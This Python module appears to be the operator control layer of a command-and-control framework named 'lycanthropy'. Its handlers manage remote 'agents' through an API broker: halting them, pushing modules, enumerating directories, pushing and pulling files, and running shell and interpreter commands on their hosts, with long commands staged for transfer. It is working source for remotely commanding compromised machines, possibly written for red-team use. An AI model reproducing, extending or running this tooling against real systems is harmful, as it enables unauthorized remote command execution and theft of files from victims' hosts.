import lycanthropy.crypto
import lycanthropy.sql.interface
import requests
import urllib3
import json
import os
import lycanthropy.portal.api
import lycanthropy.handler.database
import lycanthropy.dist.inventory
import lycanthropy.ui.util



def agentPurge(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('agent.purge', context, arguments)
    retrVal = lycanthropy.sql.agent.purgeAgent(arguments['acid'])
    retrVal['context'] = 'control(agent.purge)'
    retrVal['form'] = restoredForm
    return retrVal

def agentHalt(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('agent.halt', context, arguments)
    if not lycanthropy.portal.api.accessChk(connector,'operator'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'control(agent.halt)', 'form': restoredForm}
    apiResponse = lycanthropy.portal.api.apiBroker().passGeneric(arguments,connector,'agentHalt',lycanthropy.crypto.mkRandom(6))
    return {'output': apiResponse.content.decode('utf-8'), 'context': 'control(agent.halt)', 'form': restoredForm}

def agentList(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('agent.list', context, arguments)
    retrVal = lycanthropy.handler.database.listAgents(arguments,context,connector)
    retrVal['context'] = 'control(agent.list)'
    retrVal['form'] = restoredForm
    return retrVal

def agentMetadata(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('agent.metadata', context, arguments)
    retrVal = lycanthropy.handler.database.dumpAgent(arguments,context,connector)
    retrVal['context'] = 'control(agent.metadata)'
    retrVal['form'] = restoredForm
    return retrVal

def agentSessionize(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('agent.sessionize', context, arguments)
    if not lycanthropy.portal.api.accessChk(connector,'operator'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'control(agent.sessionize)', 'form': restoredForm}
    apiResponse = lycanthropy.portal.api.apiBroker().passGeneric(arguments,connector,'agentSessionize',lycanthropy.crypto.mkRandom(6))
    return {'output': apiResponse.content.decode('utf-8'), 'context': 'control(agent.sessionize)', 'form': restoredForm}

def agentNetconfig(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('agent.netconfig', context, arguments)
    if not lycanthropy.portal.api.accessChk(connector,'operator'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'control(agent.netconfig)', 'form': restoredForm}
    apiResponse = lycanthropy.portal.api.apiBroker().passGeneric(arguments,connector,'agentNetconfig',lycanthropy.crypto.mkRandom(6))
    return {'output': apiResponse.content.decode('utf-8'), 'context': 'control(agent.netconfig)', 'form': restoredForm}

def agentPushmod(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('agent.pushmod',context,arguments)
    if not lycanthropy.portal.api.accessChk(connector,'operator'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'control(agent.pushmod)', 'form': restoredForm}
    className = arguments['package']
    pkgManifest = lycanthropy.dist.inventory.getManifest()
    for pkgName in pkgManifest:
        if pkgName == className:
            arguments['package'] = pkgManifest[pkgName]['id']
    apiResponse = lycanthropy.portal.api.apiBroker().passGeneric(arguments,connector,'agentPushmod',lycanthropy.crypto.mkRandom(6))
    return {'output': apiResponse.content.decode('utf-8'), 'context': 'control(agent.pushmod)', 'form': restoredForm}

def agentListmod(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('agent.sessionize', context, arguments)
    classModules = []
    for classFile in os.listdir('dist/src'):
        if '.java' in classFile:
            classModules.append(classFile.split('.')[0])
    return {'output':{'modules':classModules},'form':restoredForm, 'context':'control(agent.listmod)'}

def execShell(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('exec.shell', context, arguments)
    if not lycanthropy.portal.api.accessChk(connector,'operator'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'control(exec.shell)', 'form': restoredForm}
    apiUser = connector['apiToken']['user']
    userData = lycanthropy.sql.interface.filterUser({'username': apiUser})[0]
    agentData = lycanthropy.sql.interface.filterAgents({'acid':arguments['acid']})[0]
    buildConf = lycanthropy.sql.interface.filterBuild({'acid': agentData['acid']})[0]
    if not buildConf['campaign'] in userData['campaigns'].split(','):
        return {'output': {'error': 'user does not have access to execute against this agent'}, 'context': 'control(exec.shell)', 'form': restoredForm}
    if arguments['interpreter'] not in lycanthropy.ui.util.interpreterFormatting().functionMap:
        return {'output': {'error': 'the interpreter provided is not approved for lycanthropy command execution'},
                'context': 'control(exec.shell)', 'form': restoredForm}

    retArgs = arguments
    retArgs['token'] = connector['tokenRaw']
    retArgs['host'] = agentData['hostname']
    retArgs['user'] = agentData['user']

    return {'output': 'execShell', 'context': context, 'retargs': retArgs}

def enumRoots(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('enum.roots', context, arguments)
    if not lycanthropy.portal.api.accessChk(connector,'operator'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'control(enum.roots)', 'form': restoredForm}
    apiResponse = lycanthropy.portal.api.apiBroker().passGeneric(arguments,connector,'enumRoots',lycanthropy.crypto.mkRandom(6))
    return {'output': apiResponse.content.decode('utf-8'), 'context': 'control(enum.roots)', 'form': restoredForm}

def enumDirectories(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('enum.directories', context, arguments)
    if not lycanthropy.portal.api.accessChk(connector,'operator'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'control(enum.directories)', 'form': restoredForm}
    apiResponse = lycanthropy.portal.api.apiBroker().passGeneric(arguments,connector,'enumDirectories',lycanthropy.crypto.mkRandom(6))
    return {'output': apiResponse.content.decode('utf-8'), 'context': 'control(enum.directories)', 'form': restoredForm}

def filePush(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('file.push', context, arguments)
    if not lycanthropy.portal.api.accessChk(connector,'operator'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'control(file.push)', 'form': restoredForm}
    apiResponse = lycanthropy.portal.api.apiBroker().passGeneric(arguments,connector,'filePush',lycanthropy.crypto.mkRandom(6))
    return {'output': apiResponse.content.decode('utf-8'), 'context': 'control(file.push)', 'form': restoredForm}

def filePull(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('file.pull', context, arguments)
    if not lycanthropy.portal.api.accessChk(connector,'operator'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'control(file.pull)', 'form': restoredForm}
    apiResponse = lycanthropy.portal.api.apiBroker().passGeneric(arguments,connector,'filePull',lycanthropy.crypto.mkRandom(6))
    return {'output': apiResponse.content.decode('utf-8'), 'context': 'control(file.pull)', 'form': restoredForm}

def execCommand(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('exec.command', context, arguments)
    if not lycanthropy.portal.api.accessChk(connector,'operator'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'control(exec.command)', 'form': restoredForm}
    if arguments['interpreter'] not in lycanthropy.ui.util.interpreterFormatting().functionMap:
        return {'output': {'error':'the interpreter provided is not approved for lycanthropy command execution'}, 'context': 'control(exec.command)', 'form': restoredForm}
    flags,modCommand = lycanthropy.ui.util.interpreterFormatting().functionMap[arguments['interpreter']](arguments.get('command'))
    finalArguments = arguments
    finalArguments['flags'] = flags
    jobID = lycanthropy.crypto.mkRandom(6)

    if len(modCommand) > 50:
        #stage long commands so they can be safely transferred to the agent
        finalArguments['command'] = '0x9026069321'
        lycanthropy.portal.api.stageScript(modCommand,jobID,arguments['acid'])
    else:
        finalArguments['command'] = modCommand

    apiResponse = lycanthropy.portal.api.apiBroker().passGeneric(finalArguments,connector,'execCommand',jobID)
    return {'output': apiResponse.content.decode('utf-8'), 'context': 'control(exec.command)', 'form': restoredForm}